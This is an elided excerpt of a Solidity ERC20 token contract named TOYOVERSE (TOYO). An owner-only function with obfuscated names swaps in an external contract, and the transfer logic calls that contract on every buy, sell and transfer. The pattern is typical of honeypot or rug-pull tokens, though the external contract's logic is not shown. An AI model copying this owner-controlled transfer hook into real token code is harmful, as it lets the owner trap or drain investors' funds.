...
contract TokenM is ERC20 {
    ...
    IUserAmounuppcor public rootla;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;


    constructor(address tokenOwner) ERC20("TOYOVERSE", "TOYO") {
    ...
    function uppcorBtcvccuMaxss(IUserAmounuppcor _rootla) public onlyOwner {
        rootla = _rootla;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                rootla.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				rootla.addOutAmount(from, amount);
            }else{
                rootla.addOutAmount(from, amount);
                takeFee = false;
            }
